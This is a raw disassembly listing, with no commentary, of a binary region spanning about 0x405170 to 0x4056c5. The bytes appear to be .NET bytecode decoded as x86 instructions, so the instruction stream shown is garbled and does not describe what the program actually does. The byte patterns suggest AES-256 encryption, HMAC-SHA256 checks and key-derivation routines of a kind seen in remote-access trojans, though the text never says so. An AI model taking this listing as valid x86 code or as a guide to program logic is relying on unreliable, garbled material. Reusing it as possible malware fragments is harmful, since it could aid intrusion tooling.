  405170:	28 f2                	sub    %dh,%dl
  405172:	00 00                	add    %al,(%eax)
  405174:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  40517a:	28 f2                	sub    %dh,%dl
  40517c:	00 00                	add    %al,(%eax)
  40517e:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  405184:	28 f2                	sub    %dh,%dl
  405186:	00 00                	add    %al,(%eax)
  405188:	0a a2 28 f3 00 00    	or     0xf328(%edx),%ah
  40518e:	0a 28                	or     (%eax),%ch
  405190:	f4                   	hlt
  405191:	00 00                	add    %al,(%eax)
  405193:	0a 80 3c 00 00 04    	or     0x400003c(%eax),%al
  405199:	7e 3c                	jle    0x4051d7
  40519b:	00 00                	add    %al,(%eax)
  40519d:	04 7b                	add    $0x7b,%al
  40519f:	f5                   	cmc
  4051a0:	00 00                	add    %al,(%eax)
  4051a2:	0a 7e 3c             	or     0x3c(%esi),%bh
  4051a5:	00 00                	add    %al,(%eax)
  4051a7:	04 06                	add    $0x6,%al
  4051a9:	28 06                	sub    %al,(%esi)
  4051ab:	00 00                	add    %al,(%eax)
  4051ad:	06                   	push   %es
  4051ae:	7e 0b                	jle    0x4051bb
  4051b0:	00 00                	add    %al,(%eax)
  4051b2:	04 7e                	add    $0x7e,%al
  4051b4:	10 00                	adc    %al,(%eax)
  4051b6:	00 04 02             	add    %al,(%edx,%eax,1)
  4051b9:	72 ef                	jb     0x4051aa
  4051bb:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4051bf:	4d                   	dec    %ebp
  4051c0:	00 00                	add    %al,(%eax)
  4051c2:	06                   	push   %es
  4051c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4051c4:	48                   	dec    %eax
  4051c5:	00 00                	add    %al,(%eax)
  4051c7:	06                   	push   %es
  4051c8:	7e 39                	jle    0x405203
  4051ca:	00 00                	add    %al,(%eax)
  4051cc:	04 7e                	add    $0x7e,%al
  4051ce:	08 00                	or     %al,(%eax)
  4051d0:	00 04 7e             	add    %al,(%esi,%edi,2)
  4051d3:	0f 00 00             	sldt   (%eax)
  4051d6:	04 7e                	add    $0x7e,%al
  4051d8:	04 00                	add    $0x0,%al
  4051da:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4051dd:	f6 00 00             	testb  $0x0,(%eax)
  4051e0:	0a 28                	or     (%eax),%ch
  4051e2:	94                   	xchg   %eax,%esp
  4051e3:	00 00                	add    %al,(%eax)
  4051e5:	06                   	push   %es
  4051e6:	2a 00                	sub    (%eax),%al
  4051e8:	1b 30                	sbb    (%eax),%esi
  4051ea:	03 00                	add    (%eax),%eax
  4051ec:	53                   	push   %ebx
  4051ed:	00 00                	add    %al,(%eax)
  4051ef:	00 27                	add    %ah,(%edi)
  4051f1:	00 00                	add    %al,(%eax)
  4051f3:	11 02                	adc    %eax,(%edx)
  4051f5:	28 1a                	sub    %bl,(%edx)
  4051f7:	00 00                	add    %al,(%eax)
  4051f9:	0a 03                	or     (%ebx),%al
  4051fb:	28 f7                	sub    %dh,%bh
  4051fd:	00 00                	add    %al,(%eax)
  4051ff:	0a 2c 0b             	or     (%ebx,%ecx,1),%ch
  405202:	72 1d                	jb     0x405221
  405204:	27                   	daa
  405205:	00 70 73             	add    %dh,0x73(%eax)
  405208:	f8                   	clc
  405209:	00 00                	add    %al,(%eax)
  40520b:	0a 7a 03             	or     0x3(%edx),%bh
  40520e:	7e 43                	jle    0x405253
  405210:	00 00                	add    %al,(%eax)
  405212:	04 20                	add    $0x20,%al
  405214:	50                   	push   %eax
  405215:	c3                   	ret
  405216:	00 00                	add    %al,(%eax)
  405218:	73 f9                	jae    0x405213
  40521a:	00 00                	add    %al,(%eax)
  40521c:	0a 0a                	or     (%edx),%cl
  40521e:	02 06                	add    (%esi),%al
  405220:	1f                   	pop    %ds
  405221:	20 6f fa             	and    %ch,-0x6(%edi)
  405224:	00 00                	add    %al,(%eax)
  405226:	0a 7d 41             	or     0x41(%ebp),%bh
  405229:	00 00                	add    %al,(%eax)
  40522b:	04 02                	add    $0x2,%al
  40522d:	06                   	push   %es
  40522e:	1f                   	pop    %ds
  40522f:	40                   	inc    %eax
  405230:	6f                   	outsl  %ds:(%esi),(%dx)
  405231:	fa                   	cli
  405232:	00 00                	add    %al,(%eax)
  405234:	0a 7d 42             	or     0x42(%ebp),%bh
  405237:	00 00                	add    %al,(%eax)
  405239:	04 de                	add    $0xde,%al
  40523b:	0a 06                	or     (%esi),%al
  40523d:	2c 06                	sub    $0x6,%al
  40523f:	06                   	push   %es
  405240:	6f                   	outsl  %ds:(%esi),(%dx)
  405241:	33 00                	xor    (%eax),%eax
  405243:	00 0a                	add    %cl,(%edx)
  405245:	dc 2a                	fsubrl (%edx)
  405247:	00 01                	add    %al,(%ecx)
  405249:	10 00                	adc    %al,(%eax)
  40524b:	00 02                	add    %al,(%edx)
  40524d:	00 2a                	add    %ch,(%edx)
  40524f:	00 1e                	add    %bl,(%esi)
  405251:	48                   	dec    %eax
  405252:	00 0a                	add    %cl,(%edx)
  405254:	00 00                	add    %al,(%eax)
  405256:	00 00                	add    %al,(%eax)
  405258:	1b 30                	sbb    (%eax),%esi
  40525a:	05 00 00 01 00       	add    $0x10000,%eax
  40525f:	00 28                	add    %ch,(%eax)
  405261:	00 00                	add    %al,(%eax)
  405263:	11 03                	adc    %eax,(%ebx)
  405265:	2d 0b 72 65 27       	sub    $0x2765720b,%eax
  40526a:	00 70 73             	add    %dh,0x73(%eax)
  40526d:	fc                   	cld
  40526e:	00 00                	add    %al,(%eax)
  405270:	0a 7a 73             	or     0x73(%edx),%bh
  405273:	79 00                	jns    0x405275
  405275:	00 0a                	add    %cl,(%edx)
  405277:	0a 06                	or     (%esi),%al
  405279:	1f                   	pop    %ds
  40527a:	20 6a 6f             	and    %ch,0x6f(%edx)
  40527d:	4e                   	dec    %esi
  40527e:	00 00                	add    %al,(%eax)
  405280:	0a 73 fd             	or     -0x3(%ebx),%dh
  405283:	00 00                	add    %al,(%eax)
  405285:	0a 0b                	or     (%ebx),%cl
  405287:	07                   	pop    %es
  405288:	20 00                	and    %al,(%eax)
  40528a:	01 00                	add    %eax,(%eax)
  40528c:	00 6f fe             	add    %ch,-0x2(%edi)
  40528f:	00 00                	add    %al,(%eax)
  405291:	0a 07                	or     (%edi),%al
  405293:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  405299:	ff 00                	incl   (%eax)
  40529b:	00 0a                	add    %cl,(%edx)
  40529d:	07                   	pop    %es
  40529e:	17                   	pop    %ss
  40529f:	6f                   	outsl  %ds:(%esi),(%dx)
  4052a0:	00 01                	add    %al,(%ecx)
  4052a2:	00 0a                	add    %cl,(%edx)
  4052a4:	07                   	pop    %es
  4052a5:	18 6f 01             	sbb    %ch,0x1(%edi)
  4052a8:	01 00                	add    %eax,(%eax)
  4052aa:	0a 07                	or     (%edi),%al
  4052ac:	02 7b 41             	add    0x41(%ebx),%bh
  4052af:	00 00                	add    %al,(%eax)
  4052b1:	04 6f                	add    $0x6f,%al
  4052b3:	02 01                	add    (%ecx),%al
  4052b5:	00 0a                	add    %cl,(%edx)
  4052b7:	07                   	pop    %es
  4052b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4052b9:	03 01                	add    (%ecx),%eax
  4052bb:	00 0a                	add    %cl,(%edx)
  4052bd:	06                   	push   %es
  4052be:	07                   	pop    %es
  4052bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4052c0:	04 01                	add    $0x1,%al
  4052c2:	00 0a                	add    %cl,(%edx)
  4052c4:	17                   	pop    %ss
  4052c5:	73 05                	jae    0x4052cc
  4052c7:	01 00                	add    %eax,(%eax)
  4052c9:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4052cc:	07                   	pop    %es
  4052cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4052ce:	06                   	push   %es
  4052cf:	01 00                	add    %eax,(%eax)
  4052d1:	0a 16                	or     (%esi),%dl
  4052d3:	07                   	pop    %es
  4052d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4052d5:	06                   	push   %es
  4052d6:	01 00                	add    %eax,(%eax)
  4052d8:	0a 8e 69 6f 4c 00    	or     0x4c6f69(%esi),%cl
  4052de:	00 0a                	add    %cl,(%edx)
  4052e0:	08 03                	or     %al,(%ebx)
  4052e2:	16                   	push   %ss
  4052e3:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  4052e9:	00 0a                	add    %cl,(%edx)
  4052eb:	08 6f 07             	or     %ch,0x7(%edi)
  4052ee:	01 00                	add    %eax,(%eax)
  4052f0:	0a 02                	or     (%edx),%al
  4052f2:	7b 42                	jnp    0x405336
  4052f4:	00 00                	add    %al,(%eax)
  4052f6:	04 73                	add    $0x73,%al
  4052f8:	08 01                	or     %al,(%ecx)
  4052fa:	00 0a                	add    %cl,(%edx)
  4052fc:	0d 09 06 6f 09       	or     $0x96f0609,%eax
  405301:	01 00                	add    %eax,(%eax)
  405303:	0a 1f                	or     (%edi),%bl
  405305:	20 06                	and    %al,(%esi)
  405307:	6f                   	outsl  %ds:(%esi),(%dx)
  405308:	09 01                	or     %eax,(%ecx)
  40530a:	00 0a                	add    %cl,(%edx)
  40530c:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40530f:	20 59 6f             	and    %bl,0x6f(%ecx)
  405312:	0a 01                	or     (%ecx),%al
  405314:	00 0a                	add    %cl,(%edx)
  405316:	13 04 06             	adc    (%esi,%eax,1),%eax
  405319:	16                   	push   %ss
  40531a:	6a 6f                	push   $0x6f
  40531c:	4e                   	dec    %esi
  40531d:	00 00                	add    %al,(%eax)
  40531f:	0a 06                	or     (%esi),%al
  405321:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405324:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  405327:	69 6f 4c 00 00 0a de 	imul   $0xde0a0000,0x4c(%edi),%ebp
  40532e:	1e                   	push   %ds
  40532f:	09 2c 06             	or     %ebp,(%esi,%eax,1)
  405332:	09 6f 33             	or     %ebp,0x33(%edi)
  405335:	00 00                	add    %al,(%eax)
  405337:	0a dc                	or     %ah,%bl
  405339:	08 2c 06             	or     %ch,(%esi,%eax,1)
  40533c:	08 6f 33             	or     %ch,0x33(%edi)
  40533f:	00 00                	add    %al,(%eax)
  405341:	0a dc                	or     %ah,%bl
  405343:	07                   	pop    %es
  405344:	2c 06                	sub    $0x6,%al
  405346:	07                   	pop    %es
  405347:	6f                   	outsl  %ds:(%esi),(%dx)
  405348:	33 00                	xor    (%eax),%eax
  40534a:	00 0a                	add    %cl,(%edx)
  40534c:	dc 06                	faddl  (%esi)
  40534e:	6f                   	outsl  %ds:(%esi),(%dx)
  40534f:	09 01                	or     %eax,(%ecx)
  405351:	00 0a                	add    %cl,(%edx)
  405353:	13 05 de 0a 06 2c    	adc    0x2c060ade,%eax
  405359:	06                   	push   %es
  40535a:	06                   	push   %es
  40535b:	6f                   	outsl  %ds:(%esi),(%dx)
  40535c:	33 00                	xor    (%eax),%eax
  40535e:	00 0a                	add    %cl,(%edx)
  405360:	dc 11                	fcoml  (%ecx)
  405362:	05 2a 01 34 00       	add    $0x34012a,%eax
  405367:	00 02                	add    %al,(%edx)
  405369:	00 99 00 32 cb 00    	add    %bl,0xcb3200(%ecx)
  40536f:	0a 00                	or     (%eax),%al
  405371:	00 00                	add    %al,(%eax)
  405373:	00 02                	add    %al,(%edx)
  405375:	00 67 00             	add    %ah,0x0(%edi)
  405378:	6e                   	outsb  %ds:(%esi),(%dx)
  405379:	d5 00                	aad    $0x0
  40537b:	0a 00                	or     (%eax),%al
  40537d:	00 00                	add    %al,(%eax)
  40537f:	00 02                	add    %al,(%edx)
  405381:	00 23                	add    %ah,(%ebx)
  405383:	00 bc df 00 0a 00 00 	add    %bh,0xa00(%edi,%ebx,8)
  40538a:	00 00                	add    %al,(%eax)
  40538c:	02 00                	add    (%eax),%al
  40538e:	14 00                	adc    $0x0,%al
  405390:	df f3                	fcomip %st(3),%st
  405392:	00 0a                	add    %cl,(%edx)
  405394:	00 00                	add    %al,(%eax)
  405396:	00 00                	add    %al,(%eax)
  405398:	1b 30                	sbb    (%eax),%esi
  40539a:	05 00 37 01 00       	add    $0x13700,%eax
  40539f:	00 29                	add    %ch,(%ecx)
  4053a1:	00 00                	add    %al,(%eax)
  4053a3:	11 03                	adc    %eax,(%ebx)
  4053a5:	2d 0b 72 65 27       	sub    $0x2765720b,%eax
  4053aa:	00 70 73             	add    %dh,0x73(%eax)
  4053ad:	fc                   	cld
  4053ae:	00 00                	add    %al,(%eax)
  4053b0:	0a 7a 03             	or     0x3(%edx),%bh
  4053b3:	73 4d                	jae    0x405402
  4053b5:	00 00                	add    %al,(%eax)
  4053b7:	0a 0a                	or     (%edx),%cl
  4053b9:	73 fd                	jae    0x4053b8
  4053bb:	00 00                	add    %al,(%eax)
  4053bd:	0a 0b                	or     (%ebx),%cl
  4053bf:	07                   	pop    %es
  4053c0:	20 00                	and    %al,(%eax)
  4053c2:	01 00                	add    %eax,(%eax)
  4053c4:	00 6f fe             	add    %ch,-0x2(%edi)
  4053c7:	00 00                	add    %al,(%eax)
  4053c9:	0a 07                	or     (%edi),%al
  4053cb:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4053d1:	ff 00                	incl   (%eax)
  4053d3:	00 0a                	add    %cl,(%edx)
  4053d5:	07                   	pop    %es
  4053d6:	17                   	pop    %ss
  4053d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4053d8:	00 01                	add    %al,(%ecx)
  4053da:	00 0a                	add    %cl,(%edx)
  4053dc:	07                   	pop    %es
  4053dd:	18 6f 01             	sbb    %ch,0x1(%edi)
  4053e0:	01 00                	add    %eax,(%eax)
  4053e2:	0a 07                	or     (%edi),%al
  4053e4:	02 7b 41             	add    0x41(%ebx),%bh
  4053e7:	00 00                	add    %al,(%eax)
  4053e9:	04 6f                	add    $0x6f,%al
  4053eb:	02 01                	add    (%ecx),%al
  4053ed:	00 0a                	add    %cl,(%edx)
  4053ef:	02 7b 42             	add    0x42(%ebx),%bh
  4053f2:	00 00                	add    %al,(%eax)
  4053f4:	04 73                	add    $0x73,%al
  4053f6:	08 01                	or     %al,(%ecx)
  4053f8:	00 0a                	add    %cl,(%edx)
  4053fa:	0d 09 06 6f 09       	or     $0x96f0609,%eax
  4053ff:	01 00                	add    %eax,(%eax)
  405401:	0a 1f                	or     (%edi),%bl
  405403:	20 06                	and    %al,(%esi)
  405405:	6f                   	outsl  %ds:(%esi),(%dx)
  405406:	09 01                	or     %eax,(%ecx)
  405408:	00 0a                	add    %cl,(%edx)
  40540a:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40540d:	20 59 6f             	and    %bl,0x6f(%ecx)
  405410:	0a 01                	or     (%ecx),%al
  405412:	00 0a                	add    %cl,(%edx)
  405414:	13 04 1f             	adc    (%edi,%ebx,1),%eax
  405417:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40541d:	13 05 06 11 05 16    	adc    0x16051106,%eax
  405423:	11 05 8e 69 6f 45    	adc    %eax,0x456f698e
  405429:	00 00                	add    %al,(%eax)
  40542b:	0a 26                	or     (%esi),%ah
  40542d:	02 11                	add    (%ecx),%dl
  40542f:	04 11                	add    $0x11,%al
  405431:	05 28 9c 00 00       	add    $0x9c28,%eax
  405436:	06                   	push   %es
  405437:	2d 0b 72 93 27       	sub    $0x2793720b,%eax
  40543c:	00 70 73             	add    %dh,0x73(%eax)
  40543f:	0b 01                	or     (%ecx),%eax
  405441:	00 0a                	add    %cl,(%edx)
  405443:	7a de                	jp     0x405423
  405445:	0a 09                	or     (%ecx),%cl
  405447:	2c 06                	sub    $0x6,%al
  405449:	09 6f 33             	or     %ebp,0x33(%edi)
  40544c:	00 00                	add    %al,(%eax)
  40544e:	0a dc                	or     %ah,%bl
  405450:	1f                   	pop    %ds
  405451:	10 8d 44 00 00 01    	adc    %cl,0x1000044(%ebp)
  405457:	0c 06                	or     $0x6,%al
  405459:	08 16                	or     %dl,(%esi)
  40545b:	1f                   	pop    %ds
  40545c:	10 6f 45             	adc    %ch,0x45(%edi)
  40545f:	00 00                	add    %al,(%eax)
  405461:	0a 26                	or     (%esi),%ah
  405463:	07                   	pop    %es
  405464:	08 6f 0c             	or     %ch,0xc(%edi)
  405467:	01 00                	add    %eax,(%eax)
  405469:	0a 06                	or     (%esi),%al
  40546b:	07                   	pop    %es
  40546c:	6f                   	outsl  %ds:(%esi),(%dx)
  40546d:	0d 01 00 0a 16       	or     $0x160a0001,%eax
  405472:	73 05                	jae    0x405479
  405474:	01 00                	add    %eax,(%eax)
  405476:	0a 13                	or     (%ebx),%dl
  405478:	06                   	push   %es
  405479:	06                   	push   %es
  40547a:	6f                   	outsl  %ds:(%esi),(%dx)
  40547b:	75 00                	jne    0x40547d
  40547d:	00 0a                	add    %cl,(%edx)
  40547f:	1f                   	pop    %ds
  405480:	10 6a 59             	adc    %ch,0x59(%edx)
  405483:	17                   	pop    %ss
  405484:	6a 58                	push   $0x58
  405486:	d4 8d                	aam    $0x8d
  405488:	44                   	inc    %esp
  405489:	00 00                	add    %al,(%eax)
  40548b:	01 13                	add    %edx,(%ebx)
  40548d:	07                   	pop    %es
  40548e:	11 06                	adc    %eax,(%esi)
  405490:	11 07                	adc    %eax,(%edi)
  405492:	16                   	push   %ss
  405493:	11 07                	adc    %eax,(%edi)
  405495:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405498:	45                   	inc    %ebp
  405499:	00 00                	add    %al,(%eax)
  40549b:	0a 8d 44 00 00 01    	or     0x1000044(%ebp),%cl
  4054a1:	13 08                	adc    (%eax),%ecx
  4054a3:	11 07                	adc    %eax,(%edi)
  4054a5:	16                   	push   %ss
  4054a6:	11 08                	adc    %ecx,(%eax)
  4054a8:	16                   	push   %ss
  4054a9:	11 08                	adc    %ecx,(%eax)
  4054ab:	8e 69 28             	mov    0x28(%ecx),%gs
  4054ae:	0e                   	push   %cs
  4054af:	01 00                	add    %eax,(%eax)
  4054b1:	0a 11                	or     (%ecx),%dl
  4054b3:	08 13                	or     %dl,(%ebx)
  4054b5:	09 de                	or     %ebx,%esi
  4054b7:	20 11                	and    %dl,(%ecx)
  4054b9:	06                   	push   %es
  4054ba:	2c 07                	sub    $0x7,%al
  4054bc:	11 06                	adc    %eax,(%esi)
  4054be:	6f                   	outsl  %ds:(%esi),(%dx)
  4054bf:	33 00                	xor    (%eax),%eax
  4054c1:	00 0a                	add    %cl,(%edx)
  4054c3:	dc 07                	faddl  (%edi)
  4054c5:	2c 06                	sub    $0x6,%al
  4054c7:	07                   	pop    %es
  4054c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4054c9:	33 00                	xor    (%eax),%eax
  4054cb:	00 0a                	add    %cl,(%edx)
  4054cd:	dc 06                	faddl  (%esi)
  4054cf:	2c 06                	sub    $0x6,%al
  4054d1:	06                   	push   %es
  4054d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4054d3:	33 00                	xor    (%eax),%eax
  4054d5:	00 0a                	add    %cl,(%edx)
  4054d7:	dc 11                	fcoml  (%ecx)
  4054d9:	09 2a                	or     %ebp,(%edx)
  4054db:	00 41 64             	add    %al,0x64(%ecx)
  4054de:	00 00                	add    %al,(%eax)
  4054e0:	02 00                	add    (%eax),%al
  4054e2:	00 00                	add    %al,(%eax)
  4054e4:	57                   	push   %edi
  4054e5:	00 00                	add    %al,(%eax)
  4054e7:	00 4b 00             	add    %cl,0x0(%ebx)
  4054ea:	00 00                	add    %al,(%eax)
  4054ec:	a2 00 00 00 0a       	mov    %al,0xa000000
  4054f1:	00 00                	add    %al,(%eax)
  4054f3:	00 00                	add    %al,(%eax)
  4054f5:	00 00                	add    %al,(%eax)
  4054f7:	00 02                	add    %al,(%edx)
  4054f9:	00 00                	add    %al,(%eax)
  4054fb:	00 d5                	add    %dl,%ch
  4054fd:	00 00                	add    %al,(%eax)
  4054ff:	00 3f                	add    %bh,(%edi)
  405501:	00 00                	add    %al,(%eax)
  405503:	00 14 01             	add    %dl,(%ecx,%eax,1)
  405506:	00 00                	add    %al,(%eax)
  405508:	0c 00                	or     $0x0,%al
  40550a:	00 00                	add    %al,(%eax)
  40550c:	00 00                	add    %al,(%eax)
  40550e:	00 00                	add    %al,(%eax)
  405510:	02 00                	add    (%eax),%al
  405512:	00 00                	add    %al,(%eax)
  405514:	1b 00                	sbb    (%eax),%eax
  405516:	00 00                	add    %al,(%eax)
  405518:	05 01 00 00 20       	add    $0x20000001,%eax
  40551d:	01 00                	add    %eax,(%eax)
  40551f:	00 0a                	add    %cl,(%edx)
  405521:	00 00                	add    %al,(%eax)
  405523:	00 00                	add    %al,(%eax)
  405525:	00 00                	add    %al,(%eax)
  405527:	00 02                	add    %al,(%edx)
  405529:	00 00                	add    %al,(%eax)
  40552b:	00 15 00 00 00 15    	add    %dl,0x15000000
  405531:	01 00                	add    %eax,(%eax)
  405533:	00 2a                	add    %ch,(%edx)
  405535:	01 00                	add    %eax,(%eax)
  405537:	00 0a                	add    %cl,(%edx)
  405539:	00 00                	add    %al,(%eax)
  40553b:	00 00                	add    %al,(%eax)
  40553d:	00 00                	add    %al,(%eax)
  40553f:	00 13                	add    %dl,(%ebx)
  405541:	30 03                	xor    %al,(%ebx)
  405543:	00 1c 00             	add    %bl,(%eax,%eax,1)
  405546:	00 00                	add    %al,(%eax)
  405548:	2a 00                	sub    (%eax),%al
  40554a:	00 11                	add    %dl,(%ecx)
  40554c:	17                   	pop    %ss
  40554d:	0a 16                	or     (%esi),%dl
  40554f:	0b 2b                	or     (%ebx),%ebp
  405551:	0e                   	push   %cs
  405552:	03 07                	add    (%edi),%eax
  405554:	91                   	xchg   %eax,%ecx
  405555:	04 07                	add    $0x7,%al
  405557:	91                   	xchg   %eax,%ecx
  405558:	2e 02 16             	add    %cs:(%esi),%dl
  40555b:	0a 07                	or     (%edi),%al
  40555d:	17                   	pop    %ss
  40555e:	58                   	pop    %eax
  40555f:	0b 07                	or     (%edi),%eax
  405561:	03 8e 69 32 ec 06    	add    0x6ec3269(%esi),%ecx
  405567:	2a 1b                	sub    (%ebx),%bl
  405569:	30 03                	xor    %al,(%ebx)
  40556b:	00 65 00             	add    %ah,0x0(%ebp)
  40556e:	00 00                	add    %al,(%eax)
  405570:	2b 00                	sub    (%eax),%eax
  405572:	00 11                	add    %dl,(%ecx)
  405574:	28 1b                	sub    %bl,(%ebx)
  405576:	00 00                	add    %al,(%eax)
  405578:	0a 02                	or     (%edx),%al
  40557a:	6f                   	outsl  %ds:(%esi),(%dx)
  40557b:	21 00                	and    %eax,(%eax)
  40557d:	00 0a                	add    %cl,(%edx)
  40557f:	0a 73 0f             	or     0xf(%ebx),%dh
  405582:	01 00                	add    %eax,(%eax)
  405584:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405587:	06                   	push   %es
  405588:	6f                   	outsl  %ds:(%esi),(%dx)
  405589:	c5 00                	lds    (%eax),%eax
  40558b:	00 0a                	add    %cl,(%edx)
  40558d:	0a de                	or     %dh,%bl
  40558f:	0a 08                	or     (%eax),%cl
  405591:	2c 06                	sub    $0x6,%al
  405593:	08 6f 33             	or     %ch,0x33(%edi)
  405596:	00 00                	add    %al,(%eax)
  405598:	0a dc                	or     %ah,%bl
  40559a:	73 53                	jae    0x4055ef
  40559c:	00 00                	add    %al,(%eax)
  40559e:	0a 0b                	or     (%ebx),%cl
  4055a0:	06                   	push   %es
  4055a1:	0d 16 13 04 2b       	or     $0x2b041316,%eax
  4055a6:	1f                   	pop    %ds
  4055a7:	09 11                	or     %edx,(%ecx)
  4055a9:	04 91                	add    $0x91,%al
  4055ab:	13 05 07 12 05 72    	adc    0x72051207,%eax
  4055b1:	e9 27 00 70 28       	jmp    0x28b055dd
  4055b6:	c6 00 00             	movb   $0x0,(%eax)
  4055b9:	0a 6f 55             	or     0x55(%edi),%ch
  4055bc:	00 00                	add    %al,(%eax)
  4055be:	0a 26                	or     (%esi),%ah
  4055c0:	11 04 17             	adc    %eax,(%edi,%edx,1)
  4055c3:	58                   	pop    %eax
  4055c4:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4055c7:	04 09                	add    $0x9,%al
  4055c9:	8e 69 32             	mov    0x32(%ecx),%gs
  4055cc:	da 07                	fiaddl (%edi)
  4055ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4055cf:	38 00                	cmp    %al,(%eax)
  4055d1:	00 0a                	add    %cl,(%edx)
  4055d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4055d4:	c8 00 00 0a          	enter  $0x0,$0xa
  4055d8:	2a 00                	sub    (%eax),%al
  4055da:	00 00                	add    %al,(%eax)
  4055dc:	01 10                	add    %edx,(%eax)
  4055de:	00 00                	add    %al,(%eax)
  4055e0:	02 00                	add    (%eax),%al
  4055e2:	12 00                	adc    (%eax),%al
  4055e4:	0a 1c 00             	or     (%eax,%eax,1),%bl
  4055e7:	0a 00                	or     (%eax),%al
  4055e9:	00 00                	add    %al,(%eax)
  4055eb:	00 1b                	add    %bl,(%ebx)
  4055ed:	30 02                	xor    %al,(%edx)
  4055ef:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4055f2:	00 00                	add    %al,(%eax)
  4055f4:	2c 00                	sub    $0x0,%al
  4055f6:	00 11                	add    %dl,(%ecx)
  4055f8:	73 0f                	jae    0x405609
  4055fa:	01 00                	add    %eax,(%eax)
  4055fc:	0a 0a                	or     (%edx),%cl
  4055fe:	06                   	push   %es
  4055ff:	02 6f c5             	add    -0x3b(%edi),%ch
  405602:	00 00                	add    %al,(%eax)
  405604:	0a 0b                	or     (%ebx),%cl
  405606:	de 0a                	fimuls (%edx)
  405608:	06                   	push   %es
  405609:	2c 06                	sub    $0x6,%al
  40560b:	06                   	push   %es
  40560c:	6f                   	outsl  %ds:(%esi),(%dx)
  40560d:	33 00                	xor    (%eax),%eax
  40560f:	00 0a                	add    %cl,(%edx)
  405611:	dc 07                	faddl  (%edi)
  405613:	2a 01                	sub    (%ecx),%al
  405615:	10 00                	adc    %al,(%eax)
  405617:	00 02                	add    %al,(%edx)
  405619:	00 06                	add    %al,(%esi)
  40561b:	00 0a                	add    %cl,(%edx)
  40561d:	10 00                	adc    %al,(%eax)
  40561f:	0a 00                	or     (%eax),%al
  405621:	00 00                	add    %al,(%eax)
  405623:	00 1b                	add    %bl,(%ebx)
  405625:	30 04 00             	xor    %al,(%eax,%eax,1)
  405628:	58                   	pop    %eax
  405629:	00 00                	add    %al,(%eax)
  40562b:	00 2d 00 00 11 02    	add    %ch,0x2110000
  405631:	73 4d                	jae    0x405680
  405633:	00 00                	add    %al,(%eax)
  405635:	0a 0a                	or     (%edx),%cl
  405637:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  40563d:	0b 06                	or     (%esi),%eax
  40563f:	07                   	pop    %es
  405640:	16                   	push   %ss
  405641:	1a 6f 45             	sbb    0x45(%edi),%ch
  405644:	00 00                	add    %al,(%eax)
  405646:	0a 26                	or     (%esi),%ah
  405648:	07                   	pop    %es
  405649:	16                   	push   %ss
  40564a:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40564e:	0a 0c 06             	or     (%esi,%eax,1),%cl
  405651:	16                   	push   %ss
  405652:	73 10                	jae    0x405664
  405654:	01 00                	add    %eax,(%eax)
  405656:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  40565c:	00 01                	add    %al,(%ecx)
  40565e:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  405661:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405664:	08 6f 45             	or     %ch,0x45(%edi)
  405667:	00 00                	add    %al,(%eax)
  405669:	0a 26                	or     (%esi),%ah
  40566b:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40566e:	05 de 14 09 2c       	add    $0x2c0914de,%eax
  405673:	06                   	push   %es
  405674:	09 6f 33             	or     %ebp,0x33(%edi)
  405677:	00 00                	add    %al,(%eax)
  405679:	0a dc                	or     %ah,%bl
  40567b:	06                   	push   %es
  40567c:	2c 06                	sub    $0x6,%al
  40567e:	06                   	push   %es
  40567f:	6f                   	outsl  %ds:(%esi),(%dx)
  405680:	33 00                	xor    (%eax),%eax
  405682:	00 0a                	add    %cl,(%edx)
  405684:	dc 11                	fcoml  (%ecx)
  405686:	05 2a 01 1c 00       	add    $0x1c012a,%eax
  40568b:	00 02                	add    %al,(%edx)
  40568d:	00 28                	add    %ch,(%eax)
  40568f:	00 19                	add    %bl,(%ecx)
  405691:	41                   	inc    %ecx
  405692:	00 0a                	add    %cl,(%edx)
  405694:	00 00                	add    %al,(%eax)
  405696:	00 00                	add    %al,(%eax)
  405698:	02 00                	add    (%eax),%al
  40569a:	07                   	pop    %es
  40569b:	00 44 4b 00          	add    %al,0x0(%ebx,%ecx,2)
  40569f:	0a 00                	or     (%eax),%al
  4056a1:	00 00                	add    %al,(%eax)
  4056a3:	00 1b                	add    %bl,(%ebx)
  4056a5:	30 04 00             	xor    %al,(%eax,%eax,1)
  4056a8:	52                   	push   %edx
  4056a9:	00 00                	add    %al,(%eax)
  4056ab:	00 2e                	add    %ch,(%esi)
  4056ad:	00 00                	add    %al,(%eax)
  4056af:	11 73 79             	adc    %esi,0x79(%ebx)
  4056b2:	00 00                	add    %al,(%eax)
  4056b4:	0a 0a                	or     (%edx),%cl
  4056b6:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  4056bc:	00 0a                	add    %cl,(%edx)
  4056be:	0b 06                	or     (%esi),%eax
  4056c0:	07                   	pop    %es
  4056c1:	16                   	push   %ss
  4056c2:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4056c5:	00 00                	add    %al,(%eax)
